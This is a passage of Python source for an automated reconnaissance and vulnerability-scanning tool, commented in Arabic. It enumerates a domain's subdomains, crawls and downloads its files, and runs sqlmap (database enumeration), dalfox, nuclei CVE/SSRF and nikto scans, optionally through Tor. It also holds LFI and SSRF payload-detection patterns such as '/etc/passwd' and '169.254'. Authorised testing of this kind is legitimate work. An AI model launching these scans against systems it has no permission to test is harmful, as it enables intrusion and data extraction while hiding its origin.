from datetime import datetime
import subprocess
from urllib.parse import urlparse, parse_qs, urlunparse, urlencode
from urllib.parse import  unquote
import argments
import re
import os
import json
import socket
from termcolor import colored
import google.generativeai as genai
import concurrent.futures
options=argments.setarguments()
import requests
########################################
#########     SUBDUMAIN #########
def subfinder(website, place,use_tor=False):
    print(colored(f"[+] subfinder Start: {website}", "cyan"))
    proxy_flag = get_proxy_config("subfinder", use_tor)
    if options.api:
        command = f"subfinder -d {website} -all -provider-config {place}/my_configsa/subfinder_config.yaml > {place}/subfinderOutput.txt {proxy_flag}"
    else:
        command = f"subfinder -d {website} -all  > {place}/subfinderOutput.txt"
    try:

        subprocess.run(command,capture_output=True,text=True,timeout=120, shell=True)
        with open(place+"/subfinderOutput.txt", "r", encoding="utf-8") as f:
            result = [amassf.strip() for amassf in f]
        return "the subfinder found: "+str(len(result))
    except subprocess.TimeoutExpired:
        print(colored("subfinder timed out",'red'))
def amass(website, place):
    try:
        print(colored(f"[+] amass: {website}", "cyan"))
        if options.api:
            command = f"amass enum -passive -d {website} -config {place}/my_configs/amass_config.yaml > {place}/amassOutput.txt"
        else:
            command = f"amass enum -passive -d {website}  > {place}/amassOutput.txt"
        subprocess.run(command,capture_output=True,text=True,timeout=320, shell=True)
        with open(place+"/amassOutput.txt", "r", encoding="utf-8") as f:
             result = [amassf.strip() for amassf in f]
        return "the amass found: "+str(len(result))

    except subprocess.TimeoutExpired:
        with open(place + "/amassOutput.txt", "r", encoding="utf-8") as f:
            result = [amassf.strip() for amassf in f]
        print(colored("amass timed out",'red'))
        return "the amass found: "+str(len(result))
def assetfinder(website, place):
    try:
        print(colored(f"[+] assetfinder: {website}", "cyan"))

        subprocess.run("assetfinder --subs-only "+website+" > "+place+"/assetFOutput.txt",capture_output=True,text=True,timeout=120, shell=True)
        with open(place+"/assetFOutput.txt", "r", encoding="utf-8") as f:
            result = [amassf.strip() for amassf in f]
        return "the assetfinder found: "+str(len(result))
    except subprocess.TimeoutExpired:
        print(colored("assetfinder timed out",'red'))
def subdumainEnum(website, place):
    cleenLink=clean_text(website,["https://www.","http://www.","www.","https","http","//",":"])
    subfinder(cleenLink, place)
    assetfinder(cleenLink, place)
    amass(cleenLink, place)
    merge_and_clean(website,place)
def merge_and_clean(website,path):
    try:
        print(colored("[+] Merging files and removing duplicates...","cyan"))
        command = f"sort -u {path}/subfinderOutput.txt {path}/assetFOutput.txt {path}/amassOutput.txt > {path}/finalSubs.txt"
        subprocess.run(command, shell=True)
        commandT=f"sed -i '1i {website}' {path}/finalSubs.txt"
        subprocess.run(commandT, shell=True)
        print(colored("[+] Done! Saved in finalsubs.txt","cyan"))
    except Exception as e:
        print(colored("[-] Error occured while merging files",'red'))
        commandT = f"sed -i '1i {website}' {path}/finalSubs.txt"
        subprocess.run(commandT, shell=True)
def clean_text(text, unwanted_words):

    for word in unwanted_words:
        text = text.replace(word, "")
    return text
########################################
#########  CRAWLING  #########
def katana(website, place):
    try:

        if not website.startswith(("http://", "https://")):
            url = "https://" + website
        else:
            url = website


        output_path = f"{place}/katana_urls.txt"
        command = f"katana -u {url} -silent -jc -kf -c 10 >> {output_path}"

        print(colored(f"[*] Running Katana on {url}...", "cyan"))


        subprocess.run(command, shell=True, timeout=300, check=True)

    except subprocess.TimeoutExpired:
        print(colored("[-] Katana timed out (took too long to crawl JS).", 'red'))
    except subprocess.CalledProcessError as e:
        print(colored(f"[-] Katana Error: {e}", 'red'))
def combine(link, place):
    try:
        crawlig(link, place)
        katana(link, place)

    except subprocess.TimeoutExpired:
        print("error")
def crawlig(website, place):
    try:
        if not website.startswith(("http://", "https://")):
            url = "https://" + website
        else:
            url = website
        subprocess.run("echo "+url+" | "+"hakrawler  "+" >> "+place+"/hackrwlerurls.txt" ,capture_output=True,text=True,timeout=120, shell=True)
    except subprocess.TimeoutExpired:
        print(colored("hakrawler timed out",'red'))
def deepCrawl(website, place):
    try:
        print(colored(f"[+] Crawling: {website}", "cyan"))
        crawlig(website, place)

        with open(place + "/finalSubs.txt", "r") as file:
            links = file.readlines()
        for link in links:
            link = link.strip()
            if link:
                combine(link, place)
        try:
            print(colored("[+] Merging files and removing duplicates...", "cyan"))
            command = f"sort -u {place}/hackrwlerurls.txt {place}/katana_urls.txt > {place}/finalRawlers.txt"
            subprocess.run(command, shell=True)

            print(colored("[+] Done! Saved in finalRawlers.txt", "cyan"))
        except Exception as e:
            print(colored("[-] Error occured while merging files", 'red'))
        extract_parameter_urls(place)
    except Exception as e:
        print(colored("[-] Error occured while crawlingDeep", 'red'))
        extract_parameter_urls(place)
########################################
#########     EXTRACT AND DOWNLOAD  #########
def extract_parameter_urls(place):
    input_file = os.path.join(place, "finalRawlers.txt")
    output_file = os.path.join(place, "Parameters.txt")

    print(colored(f"[+] Filtering & Deduplicating URLs with parameters from {input_file}...", "blue"))

    ignored_extensions = (".jpg", ".jpeg", ".png", ".gif", ".css", ".js", ".svg", ".woff", ".ico")

    unique_urls = []  # لتخزين الروابط النهائية
    seen_signatures = set()  # لتخزين "بصمة" الرابط لمنع التكرار

    count = 0
    try:
        # 1. القراءة والفلترة في الذاكرة
        if os.path.exists(input_file):
            with open(input_file, 'r', encoding='utf-8', errors='ignore') as f_in:
                for line in f_in:
                    url = line.strip()

                    # الشرط الأول: وجود باراميترات
                    if "?" in url and "=" in url:
                        # الشرط الثاني: الامتدادات
                        if not url.lower().endswith(ignored_extensions):

                            # === اللوجيك الذكي (Smart Deduplication) ===
                            try:
                                parsed = urlparse(url)
                                # بنجيب أسماء الباراميترات (keys) فقط من غير القيم
                                query_params = parse_qs(parsed.query)
                                param_keys = tuple(sorted(query_params.keys()))

                                # البصمة = الدومين + المسار + أسماء الباراميترات
                                # أي رابط ليه نفس البصمة دي هيعتبر تكرار ومش هيتحفظ
                                signature = (parsed.netloc, parsed.path, param_keys)

                                if signature not in seen_signatures:
                                    seen_signatures.add(signature)
                                    unique_urls.append(url)
                                    count += 1
                            except Exception:
                                # لو حصل ايرور في تحليل رابط معين، عده ومتقفش
                                pass

            # 2. حفظ النتائج النظيفة في الملف
            # استخدمنا 'w' عشان يكتب النتائج الجديدة، لو عاوز 'a' غيرها
            with open(output_file, 'w', encoding='utf-8') as f_out:
                for unique_url in unique_urls:
                    f_out.write(unique_url + "\n")

            print(colored(f"[+] Done! Found {count} UNIQUE parameter URLs. Saved to {output_file}", "cyan"))

            # تعديل الصلاحيات
            subprocess.run(f"chmod -R 777 {output_file}", shell=True)

        else:
            print(colored(f"[-] Error: File {input_file} not found!", "red"))

    except Exception as e:
        print(colored(f"[-] Critical Error in filtering: {e}", "red"))
def extract_files_urls(place,type):
    input_file=place+f"/finalRawlers.txt"
    output_file=place+f"/{type}.txt"
    print(f"[+] Filtering URLs with {type} from {input_file}...")
    ignored_extensions = (".jpg", ".jpeg", ".png", ".gif", ".css", ".svg")
    count = 0
    try:
        with open(input_file, 'r') as f_in, open(output_file, 'w') as f_out:
            for line in f_in:
                url = line.strip()
                if f".{type}" in url :
                    if not url.lower().endswith(ignored_extensions) and not url.lower().endswith(f".{type}"):
                        f_out.write(url + "\n")
                        count += 1
        print(colored(f"[+] Done! Found {count} {type} URLs. Saved to {output_file}","cyan") )

    except FileNotFoundError:
        print(colored(f"[-] Error: File {input_file} not found!","red") )
def extract_links(file_path,type):
    links = set()

    with open(file_path+f"/{type}.txt", "r", encoding="utf-8", errors="ignore") as file:
        for line in file:
            line = line.strip()

            if re.search(f"\.{type}(\?|$)", line.lower()):
                links.add(line)

    return links
def downloadFiles(php_links,place,type):
    download_dir = os.path.join(place, f"{type}_files")
    os.makedirs(download_dir, exist_ok=True)
    print(colored(f"[+] Downloading {len(php_links)} files into: {download_dir}","yellow", attrs=["bold"]))
    for url in php_links:
        try:
            print(colored(f"   └── Downloading: {url}","cyan"))

            command = [
                "wget",
                "-q",
                "-P", download_dir,
                "--no-check-certificate",
                "--content-disposition",
                url
            ]

            subprocess.run(command, check=True)

        except Exception as e:
            print(colored(f"[-] Error downloading {url}: {e}","red"))
    try:

        subprocess.run(f"chmod -R 777 {download_dir}", shell=True)
        print(colored(f"[+]You can now edit files in: {download_dir}","yellow", attrs=["bold"]))
    except Exception as e:
        print(colored(f"[-] Failed to fix permissions: {e}",color="red"))
def download(place,type):
    extract_files_urls(place,type)
    lick=extract_links(place, type)
    downloadFiles(lick,place,type)
def downloadImportant(place):
    download(place,"js")
    download(place, "php")
    download(place, "html")
########################################
############   SQLI   ################
def scan_sqli(url, place,use_tor=False):
    print(colored(f"[+] Scanning for SQLi: {url}", "cyan"))
    proxy_flag = get_proxy_config("sqlmap", use_tor)
    command = f"sqlmap -u '{url}' --batch --level 1 --risk 1 --dbs {proxy_flag}"
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        output_lines = result.stdout.splitlines()
        injections = []
        current_type = "Unknown"
        for line in output_lines:
            line = line.strip()
            if line.startswith("Type:"):
                current_type = line.split("Type:")[1].strip()

            elif line.startswith("Payload:"):
                payload = line.split("Payload:")[1].strip()
                injections.append({"type": current_type, "payload": payload})

        # الشرط: لو لقينا بايلودز أو كلمة available databases
        if injections or "available databases" in result.stdout:
            print(colored(f"[!!!] VULNERABLE TO SQLi: {url}", "green", attrs=['bold']))

            # حفظ النتائج بتنسيق مرتب
            with open(place + "/vulnerable_sqli.txt", "a") as f:
                f.write(f"Target: {url}\n")

                if injections:
                    f.write("Payloads Found:\n")
                    for inj in injections:
                        f.write(f"  [*] Type: {inj['type']}\n")
                        f.write(f"  [*] Payload: {inj['payload']}\n")
                        f.write("-" * 30 + "\n")
                else:
                    f.write("  [*] Vulnerable (Databases extracted but no specific payload captured in parsing)\n")

                f.write("=" * 60 + "\n\n")
        else:
            print(colored(f"[-] Not Vulnerable {url}", "red"))

    except Exception as e:
        print(colored(f"Error SQLI {url}: {e}", "red"))
def SQLI( place,use_tor=False):
    try:
        with open(place + "/Parameters.txt", "r") as file:
            links = file.readlines()
        for link in links:
            link = link.strip()
            if link:
                scan_sqli(link, place,use_tor)
    except Exception as e:
        print(colored("[-] Error occured while scanning", 'red'))
########################################
############   XSS   ################
def scan_xss(url, place,use_tor=False):
    print(colored(f"[+] Scanning for XSS: {url}","cyan"))
    proxy_flag = get_proxy_config("dalfox", use_tor)
    # --no-color: مهم جداً عشان النصوص تتخزن نظيفة من غير رموز الألوان
    command = f"dalfox url '{url}' --no-color {proxy_flag}"

    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True)

        # نقسم المخرجات لسطور عشان نفحص كل سطر لوحده
        output_lines = result.stdout.splitlines()

        found_vulnerability = False
        captured_pocs = []

        for line in output_lines:
            # Dalfox بيحط اللينك المصاب والبايلود جنب كلمة [POC]
            if "[POC]" in line:
                found_vulnerability = True
                # تنظيف السطر ومسح المسافات الزايدة
                poc_line = line.replace("[POC]", "").strip()
                captured_pocs.append(poc_line)

        # لو لقينا ثغرات، نفتح الملف ونكتب التفاصيل
        if found_vulnerability:
            print(colored(f"[!!!] VULNERABLE TO XSS: {url}","green" ,attrs=['bold']))
            with open(place + "/vulnerable_xss.txt", "a") as f:
                f.write(f"Target: {url}\n")
                f.write(f"Status: Vulnerable\n")
                f.write("Payloads / POCs found:\n")
                for poc in captured_pocs:
                    f.write(f" -> {poc}\n")
                f.write("-" * 50 + "\n")

    except Exception as e:
        print(f"Error scanning {url}: {e}")
def XSS( place,use_tor=False):
    try:
        with open(place + "/Parameters.txt", "r") as file:
            links = file.readlines()
        for link in links:
            link = link.strip()
            if link:
                scan_xss(link, place,use_tor)
    except Exception as e:
        print(colored("[-] Error occured while XSS", 'red'))
########################################
############   INFODIS AND CMS   ################
def scan_info_disclosure_nikto(url, place):
    print(colored(f"[+] Scanning for Info Disclosure using Nikto: {url}", "cyan"))



    command = f"nikto -h '{url}' -maxtime 2m -nointeractive"

    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True)

        output_lines = result.stdout.splitlines()
        found_info = []

        for line in output_lines:
            if line.startswith("+"):
                clean_line = line.replace("+ ", "").strip()
                found_info.append(clean_line)

        if found_info:
            print(colored(f"[!!!] Info Disclosure Found: {url}", "yellow"))

            with open(place + "/info_disclosure_nikto.txt", "a") as f:
                f.write("=" * 60 + "\n")
                f.write(f"Target: {url}\n")
                f.write("Nikto Findings:\n")

                for info in found_info:
                    f.write(f"  [!] {info}\n")

                f.write("=" * 60 + "\n\n")
        else:
            print(colored(f"[-] No critical info found by Nikto for {url}", "white"))

    except Exception as e:
        print(colored(f"Error Nikto Scan {url}: {e}", "red"))
def scan_cms(url, place):
    print(colored(f"[+] Fingerprinting CMS for: {url}", "cyan"))

    # --color=never: عشان المخرجات تكون نص صافي ونعرف نعملها parsing
    # -v: verbose عشان يجيب تفاصيل أكتر
    command = f"whatweb '{url}' --color=never -v"

    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True)

        # هنحاول نستخرج أهم معلومات بس عشان التقرير ميبقاش زحمة
        output = result.stdout
        cms_info = []

        # Regex يدور على أي حاجة فيها كلمة CMS أو إصدارات
        # WhatWeb بيكتب النتايج بوضوح، احنا هناخد السطر اللي فيه "Summary" أو Plugins

        # طريقة بسيطة: حفظ التقرير كما هو لكن منظم
        if output:
            print(colored(f"[+] CMS Info Found for: {url}", "green"))

            with open(place + "/cms_results.txt", "a") as f:

                f.write(f"Target: {url}\n")
                f.write("Details:\n")

                # تنظيف المخرجات: ناخد السطور المهمة بس
                for line in output.splitlines():
                    line = line.strip()
                    # WhatWeb بيرجع سطور كتير، احنا عاوزين اللي فيها معلومات
                    if line and not line.startswith("http"):
                        f.write(f"  {line}\n")

                f.write("=" * 60 + "\n\n")
        else:
            print(colored(f"[-] No CMS info found for {url}", "yellow"))

    except Exception as e:
        print(colored(f"Error CMS Scan {url}: {e}", "red"))
########################################
############   GET LENGTH AND SUMRIZE   ################
def get_file_length(filename):
    try:
        with open(filename, 'r') as f:
            # دالة sum دي سريعة جداً وبتعد السطور اللي فيها كلام بس (عشان لو فيه سطور فاضية متتحسبش)
            count = sum(1 for line in f if line.strip())
        return count
    except FileNotFoundError:
        return 0  # لو الملف مش موجود نرجع صفر
    except Exception as e:
        print(f"Error reading {filename}: {e}")
        return 0
def count_vulnerabilities(filename):
    count = 0
    try:
        with open(filename, 'r') as f:
            for line in f:
                # بنعد المرات اللي كلمة Target ظهرت فيها في بداية السطر
                if line.strip().startswith("Target:") or line.strip().startswith("[VULN CHECK]") or line.strip().startswith("[System File Access"):
                    count += 1
        return count
    except FileNotFoundError:
        return 0  # لو الملف مش موجود (يعني مفيش ثغرات لسه)
def SumrizeTxt(website,place):
    try:
        try:
            amass = get_file_length(place + "/amassOutput.txt")
        except Exception as e:
            print(colored(f"[-] Error amaas Sumrizing: {e}", "red"))
        try:
            assetfinder = get_file_length(place + "/assetFOutput.txt")
        except Exception as e:
            print(colored(f"[-] Error assetFinder: {e}", "red"))
        try:
            subfinder = get_file_length(place + "/subfinderOutput.txt")
        except Exception as e:
            print(colored(f"[-] Error subfinder: {e}", "red"))
        try:
            totalSubs = get_file_length(place + "/finalSubs.txt")
        except Exception as e:
            print(colored(f"[-] Error totalSubs: {e}", "red"))
        try:
            TotalParams = get_file_length(place + "/Parameters.txt")
        except Exception as e:
            print(colored(f"[-] Error TotalParams: {e}", "red"))
        try:
            sqli = count_vulnerabilities(place + "/vulnerable_sqli.txt")
        except Exception as e:
            print(colored(f"[-] Error sqli: {e}", "red"))
        try:
            xss = count_vulnerabilities(place + "/vulnerable_xss.txt")
        except Exception as e:
            print(colored(f"[-] Error xss: {e}", "red"))
        php = get_file_length(place + "/php.txt")
        try:
            js = get_file_length(place + "/js.txt")
        except Exception as e:
            print(colored(f"[-] js: {e}", "red"))
        try:
            json=get_file_length(place + "/json.txt")
        except Exception as e:
            print(colored(f"[-] json: {e}", "red"))
        try:
            html = get_file_length(place + "/html.txt")
        except Exception as e:
            print(colored(f"[-] html: {e}", "red"))
        try:
            cve = count_vulnerabilities(place + "/cve_exploits.txt")
        except Exception as e:
            print(colored(f"[-] cve: {e}", "red"))
        try:
            SSRF=get_file_length(place + "/ssrf.txt")
        except Exception as e:
            print(colored(f"[-] SSRF: {e}", "red"))
        try:
            lfi=get_file_length(place + "/lfi.txt")+get_file_length(place + "/lfi_results.txt")
        except Exception as e:
            print(colored(f"[-] lfi: {e}", "red"))
        try:
            cves=get_file_length(place + "/cve_nuclei_active.txt")
        except Exception as e:
            print(colored(f"[-] cves: {e}", "red"))

        return f"""
     Welcome to RecTool!
Your website is {website}
       Subdomains
amass: {amass}
assetfinder: {assetfinder}
subfinder: {subfinder}
total Uniqe Subs: {totalSubs}
_____________________________
       Params & Fils
parameters: {TotalParams}
php: {php}
JS: {js}
HTML page: {html}
json: {json}
_____________________________
       vulnerabilty
 vulnerable XSS: {xss}
 vulnerable Sqli: {sqli}
 vulnerable lfi: {lfi}
 vulnerable ssrf: {SSRF}
____________________________
           CVEs
 CVE: {cve}
 CVE_Active: {cves}
"""
    except Exception as e:
        print(colored("[-] Error occured while Make Masege", 'red'))
######################################
########     CVE  Detector   ########
def clean_version(raw_version):
    # تحويل القائمة لنص
    if isinstance(raw_version, list):
        if len(raw_version) > 0:
            ver_str = str(raw_version[0])
        else:
            return ""
    else:
        ver_str = str(raw_version)

    match = re.search(r'([0-9]+\.[0-9]+(\.[0-9]+)?)', ver_str)

    if match:
        return match.group(1)
    return ver_str
def check_exploits_searchsploit(product_name, version, place):

    if version:
        query = f"{product_name} {version}"
        print(colored(f"       [*] Searching Exploits for: {query}...", "cyan"))
    else:
        query = f"{product_name}"
        print(colored(f"       [*] Searching Generic Exploits for: {query}...", "yellow"))

    command = f"searchsploit '{query}' --json"

    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True)

        try:
            data = json.loads(result.stdout)
            exploits = data.get('RESULTS_EXPLOIT', [])

            if exploits:
                print(colored(f"       [!] FOUND {len(exploits)} Exploits/CVEs!", "red", attrs=['bold']))

                report_file = os.path.join(place, "cve_exploits.txt")
                with open(report_file, "a") as f:
                    f.write(f"\n{'=' * 50}\n")
                    f.write(f"[VULN CHECK] Target: {query}\n")
                    f.write(f"{'=' * 50}\n")

                    for ex in exploits[:5]:
                        title = ex.get('Title', 'No Title')
                        edb_id = ex.get('EDB-ID', 'N/A')

                        print(colored(f"       └── [EDB-{edb_id}] {title[:60]}...", "yellow"))

                        f.write(f"ID: {edb_id}\nTitle: {title}\nLink: https://www.exploit-db.com/exploits/{edb_id}\n")
                        f.write("-" * 30 + "\n")
            else:
                print(colored("       [-] No exploits found in local DB.", "green"))

        except json.JSONDecodeError:
            print(colored("       [-] No results.", "white"))

    except Exception as e:
        print(colored(f"       [-] Error running searchsploit: {e}", "red"))
def scan_cve_nuclei(place, use_tor=False):
    targets_file = f"{place}/finalSubs.txt"
    output_file = f"{place}/cve_nuclei_active.txt"

    print(colored(f"\n[+] Starting Active CVE Scan using Nuclei (Real Exploitation)...", "cyan"))

    if not os.path.exists(targets_file):
        print(colored("[-] No targets file found for Nuclei.", "red"))
        return

    proxy_flag = ""
    if use_tor:
        proxy_flag = " -proxy socks5://127.0.0.1:9050"


    command = f"nuclei -l {targets_file} -tags cves -severity critical,high,medium {proxy_flag} -o {output_file} -silent"

    try:

        subprocess.run(command, shell=True, timeout=900)

        if os.path.exists(output_file) and os.path.getsize(output_file) > 0:
            print(colored(f"   [!!!] CONFIRMED CVEs FOUND BY NUCLEI!", "red", attrs=['bold']))
            print(colored(f"   Check report: {output_file}", "yellow"))

            with open(output_file, 'r') as f:
                print("   Active Findings:")
                for i, line in enumerate(f):
                    if i < 3:
                        print(colored(f"   └── {line.strip()}", "red"))
                    else:
                        break
        else:
            print(colored("   [-] No active CVEs detected by Nuclei.", "green"))

    except subprocess.TimeoutExpired:
        print(colored("   [-] Nuclei CVE Scan Timed out (Skipping).", "white"))
    except Exception as e:
        print(colored(f"   [-] Error: {e}", "red"))
def scan_cve_full(url, place):
    print(colored(f"\n[+] Starting Advanced CMS & Vulnerability Analysis: {url}", "blue", attrs=['bold']))

    json_file = os.path.join(place, "whatweb_temp.json")

    command = f"whatweb {url} --log-json {json_file} --color=never"

    try:
        subprocess.run(command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        if os.path.exists(json_file):
            with open(json_file, 'r') as f:
                try:
                    data = json.load(f)
                    if not data:
                        print(colored("[-] WhatWeb returned no data.", "yellow"))
                        return

                    plugins = data[0].get('plugins', {})
                    print(colored("[+] Technologies Detected:", "green"))

                    important_techs = [
                        'WordPress', 'Apache', 'nginx', 'PHP', 'Joomla',
                        'Drupal', 'Microsoft-IIS', 'Tomcat', 'Python', 'OpenSSL'
                    ]

                    for name, info in plugins.items():
                        raw_version = info.get('version', '')

                        clean_ver = clean_version(raw_version)

                        display_ver = clean_ver if clean_ver else "Unknown"
                        print(f"   └── {name} : {display_ver}")

                        if name in important_techs:
                            check_exploits_searchsploit(name, clean_ver, place)

                except json.JSONDecodeError:
                    pass
        else:
            print(colored("[-] WhatWeb output file not found.", "red"))

    except Exception as e:
        print(colored(f"[-] Error in CVE Module: {e}", "red"))
######################################
########     proxy  support   ########
def is_tor_running():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        return s.connect_ex(('127.0.0.1', 9050)) == 0
def get_proxy_config(tool_name, use_tor):

    if not use_tor:
        if tool_name == "requests": return None
        return ""

    tor_proxy = "socks5://127.0.0.1:9050"

    if tool_name == "sqlmap":
        return f" --proxy={tor_proxy} --check-tor"

    elif tool_name == "dalfox":
        return f" --proxy {tor_proxy}"

    elif tool_name == "whatweb":
        return f" --proxy {tor_proxy} --proxy-type socks5"

    elif tool_name == "subfinder":
        return f" -proxy {tor_proxy}"

    return ""
#######################################
#############    SSRF     #############
def scan_ssrf_mass(place, use_tor=False):
    targets_file = f"{place}/Parameters.txt"
    output_file = f"{place}/ssrf.txt"

    print(colored(f"\n[+] Starting Massive SSRF Scan on all targets...", "magenta"))

    if not os.path.exists(targets_file):
        print(colored("[-] No targets file found to scan.", "red"))
        return

    # إعداد البروكسي
    proxy_flag = ""
    if use_tor:
        proxy_flag = " -proxy socks5://127.0.0.1:9050"

    # الأمر السحري:
    # -l: بنحددله ليستة (فايل) بدل رابط واحد (-u)
    # -tags ssrf: دور على ssrf بس
    command = f"nuclei -l {targets_file} -tags ssrf {proxy_flag} -o {output_file} -silent"

    try:
        # وقت أطول شوية (10 دقايق) عشان ده فحص جماعي
        subprocess.run(command, shell=True, timeout=600)

        # فحص النتائج
        if os.path.exists(output_file) and os.path.getsize(output_file) > 0:
            print(colored(f"   [!!!] SSRF VULNERABILITIES FOUND!", "red", attrs=['bold']))
            print(colored(f"   Check report: {output_file}", "yellow"))

            # عرض عينة من النتائج
            with open(output_file, 'r') as f:
                print("   Samples:")
                for i, line in enumerate(f):
                    if i < 5:
                        print(colored(f"   └── {line.strip()}", "yellow"))
                    else:
                        break
        else:
            print(colored("   [-] No SSRF found in any target.", "white"))

    except subprocess.TimeoutExpired:
        print(colored("   [-] Scan Timed out.", "white"))
    except Exception as e:
        print(colored(f"   [-] Error: {e}", "red"))

#######################################
############ Report Generator #########
def generate_json_report(domain, place):
    print(colored(f"\n[+] Generating Final JSON Report...", "cyan", attrs=['bold']))

    def parse_sqli_file(filename):
        file_path = os.path.join(place, filename)
        if not os.path.exists(file_path): return []

        results = []
        current_target = None
        current_type = None

        try:
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                lines = f.readlines()

            for line in lines:
                line = line.strip()

                if line.startswith("Target:"):
                    if current_target is not None:
                        results.append(current_target)

                    current_target = {
                        "url": line.replace("Target:", "").strip(),
                        "payloads": []
                    }
                    current_type = None

                elif line.startswith("[*] Type:"):
                    if current_target is not None:
                        current_type = line.replace("[*] Type:", "").strip()


                elif line.startswith("[*] Payload:"):
                    if current_target is not None and current_type:
                        payload_data = line.replace("[*] Payload:", "").strip()
                        current_target["payloads"].append({
                            "type": current_type,
                            "payload": payload_data
                        })


            if current_target is not None:
                results.append(current_target)

            return results

        except Exception as e:
            print(f"Error parsing SQLi file: {e}")
            return []


    def parse_xss_file(filename):
        file_path = os.path.join(place, filename)
        if not os.path.exists(file_path): return []

        results = []
        current_target = None

        try:
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                lines = f.readlines()

            for line in lines:
                line = line.strip()

                if line.startswith("Target:"):
                    if current_target is not None:
                        results.append(current_target)

                    current_target = {
                        "url": line.replace("Target:", "").strip(),
                        "pocs": []
                    }

                elif line.startswith("->"):
                    if current_target is not None:
                        raw_poc = line.replace("->", "").strip()

                        parts = raw_poc.split(" ", 1)
                        if len(parts) == 2:
                            current_target["pocs"].append({
                                "info": parts[0],  # [R][GET][inHTML]
                                "payload_url": parts[1]  # الرابط المحقون
                            })
                        else:
                            current_target["pocs"].append({"raw_poc": raw_poc})

            if current_target is not None:
                results.append(current_target)

            return results

        except Exception as e:
            print(f"Error parsing XSS file: {e}")
            return []

    def read_lines(filename):
        path = os.path.join(place, filename)
        if os.path.exists(path):
            with open(path, 'r', encoding='utf-8', errors='ignore') as f:
                return [l.strip() for l in f if l.strip()]
        return []

    def count_files(dirname):
        path = os.path.join(place, dirname)
        return len(os.listdir(path)) if os.path.exists(path) else 0


    def parse_cve_file(filename):
            file_path = os.path.join(place, filename)
            if not os.path.exists(file_path): return []

            results = []
            current_target = None
            current_exploit = {}

            try:
                with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                    lines = f.readlines()

                for line in lines:
                    line = line.strip()

                    if line.startswith("[VULN CHECK] Target:"):
                        if current_target:
                            results.append(current_target)

                        target_name = line.replace("[VULN CHECK] Target:", "").strip()
                        current_target = {
                            "software": target_name,
                            "exploits": []
                        }

                    elif line.startswith("ID:"):
                        current_exploit = {"id": line.replace("ID:", "").strip()}
                    elif line.startswith("Title:"):
                        current_exploit["title"] = line.replace("Title:", "").strip()
                    elif line.startswith("Link:"):
                        current_exploit["link"] = line.replace("Link:", "").strip()

                    elif line.startswith("---") or line.startswith("==="):
                        if current_target and current_exploit:
                            current_target["exploits"].append(current_exploit)
                            current_exploit = {}

                if current_target:
                    if current_exploit: current_target["exploits"].append(current_exploit)
                    results.append(current_target)

                return results
            except Exception as e:
                print(f"Error parsing CVE file: {e}")
                return []

    def parse_cms_file(filename):
            file_path = os.path.join(place, filename)
            if not os.path.exists(file_path): return {}

            cms_data = {
                "target": "",
                "server_info": {},
                "detected_technologies": []
            }

            try:
                with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                    lines = f.readlines()

                for line in lines:
                    line = line.strip()

                    if line.startswith("Target:"):
                        cms_data["target"] = line.replace("Target:", "").strip()

                    # استخراج المعلومات الأساسية
                    elif line.startswith("IP"):
                        cms_data["server_info"]["ip"] = line.split(":")[-1].strip()
                    elif line.startswith("Country"):
                        cms_data["server_info"]["country"] = line.split(":")[-1].strip()
                    elif line.startswith("Title"):
                        cms_data["server_info"]["title"] = line.split(":", 1)[-1].strip()

                    elif line.startswith("Summary"):
                        raw_summary = line.split(":", 1)[-1].strip()
                        # Summary بيجي شكله: PHP[5.6], HTTPServer[nginx]
                        techs = raw_summary.split(", ")
                        for tech in techs:
                            cms_data["detected_technologies"].append(tech.strip())

                return cms_data
            except Exception as e:
                print(f"Error parsing CMS file: {e}")
                return {}

    def parse_lfi_file(filename):
        """
        تقرأ ملف LFI وتحوله لقائمة بيانات منظمة للتقرير
        """
        results = []
        file_path = os.path.join(place, filename)
        # التأكد إن الملف موجود أصلاً
        if not os.path.exists(file_path):
            return []

        try:
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                lines = f.readlines()

            # Regex لفصل نوع الثغرة عن الرابط
            # النمط: [وصف الثغرة] رابط
            log_pattern = re.compile(r"^\[(.*?)\]\s+(http.*)$")

            for line in lines:
                line = line.strip()
                if not line: continue

                match = log_pattern.match(line)
                if match:
                    vuln_desc = match.group(1)  # مثلا: System File Access (/etc/passwd)
                    full_url = match.group(2)  # الرابط الكامل

                    # استخراج البايلود والبارميتر المصاب عشان التقرير يكون احترافي
                    parsed_url = urlparse(full_url)
                    params = parse_qs(parsed_url.query)

                    infected_param = "unknown"
                    payload_decoded = "unknown"

                    # بندور في البارميترات عشان نلاقي البايلود ونفك تشفيره
                    for key, value in params.items():
                        val = value[0]
                        decoded_val = unquote(val)
                        # لو لقينا علامات الـ Traversal او etc/passwd يبقى ده البارميتر المصاب
                        if "../" in decoded_val or "/etc/passwd" in decoded_val or ".." in decoded_val:
                            infected_param = key
                            payload_decoded = decoded_val
                            break
                    results.append({
                        "type": "Local File Inclusion (LFI)",
                        "description": vuln_desc,
                        "url": full_url,
                        "vulnerable_parameter": infected_param,
                        "payload": payload_decoded
                    })
                    return results
        except Exception as e:
            print(f"Error parsing LFI file: {e}")
            return []

    def parse_ssrf_file(filename):
        """
        تحويل نتائج SSRF لنظام JSON
        """
        file_path = os.path.join(place, filename)
        results = []
        if not os.path.exists(file_path):
            return []

        try:
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                lines = f.readlines()

            log_pattern = re.compile(r"^\[(.*?)\]\s+(http.*)$")

            for line in lines:
                line = line.strip()
                match = log_pattern.match(line)
                if match:
                    vuln_desc = match.group(1)
                    full_url = match.group(2)

                    # محاولة استخراج البايلود
                    parsed_url = urlparse(full_url)
                    params = parse_qs(parsed_url.query)
                    infected_param = "unknown"
                    payload = "unknown"

                    # بندور على البايلودز المعروفة جوه البراميترات
                    for key, value in params.items():
                        val = unquote(value[0])
                        # لو القيمة فيها ip او localhost او 169.254
                        if "127.0.0.1" in val or "localhost" in val or "169.254" in val or "file://" in val:
                            infected_param = key
                            payload = val
                            break

                    results.append({
